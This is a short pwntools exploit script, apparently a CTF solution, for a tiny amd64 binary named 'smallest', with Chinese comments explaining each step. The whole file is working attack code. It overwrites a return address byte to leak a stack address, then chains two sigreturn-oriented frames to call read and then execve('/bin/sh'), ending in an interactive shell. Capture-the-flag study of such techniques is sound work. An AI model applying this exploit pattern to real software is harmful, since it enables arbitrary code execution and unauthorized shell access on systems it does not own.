from pwn import *
p = process('./smallest')
elf = ELF('./smallest')
context(os='linux',arch='amd64',log_level='debug')

syscall_ret = 0x4000BE
start_addr = 0x4000B0

payload = p64(start_addr) * 3
p.send(payload)

p.send(b'\xb3')#再次调用read函数时，将它的返回地址低位修改成b3，这样就可以跳过xor rax, rax，使rax为read的返回值，也就是1
#因为rax为1，所以下一次syscall回去执行write函数，泄露栈上地址
stack_addr = u64(p.recv()[8:16])#前八个字节是start_addr

log.success('leak stack_addr: ' + hex(stack_addr))

read = SigreturnFrame()
read.rax = constants.SYS_read
read.rdi = 0
read.rsi = stack_addr
read.rdx = 0x400
read.rsp = stack_addr
read.rip = syscall_ret
read_frame_payload = flat(start_addr, syscall_ret, read)
p.send(read_frame_payload)
p.send(read_frame_payload[8:8+15])


execve = SigreturnFrame()
execve.rax = constants.SYS_execve
execve.rdi = stack_addr + 0x120
execve.rsi = 0x0
execve.rdx = 0x0
execve.rsp = 0xdeadbeef#随便填
execve.rip = syscall_ret
execv_frame_payload = flat(start_addr, syscall_ret, execve)
execv_frame_payload += flat((0x120-len(execv_frame_payload))*'\x00', '/bin/sh\x00')
p.send(execv_frame_payload)
p.send(execv_frame_payload[8:8+15])

p.interactive()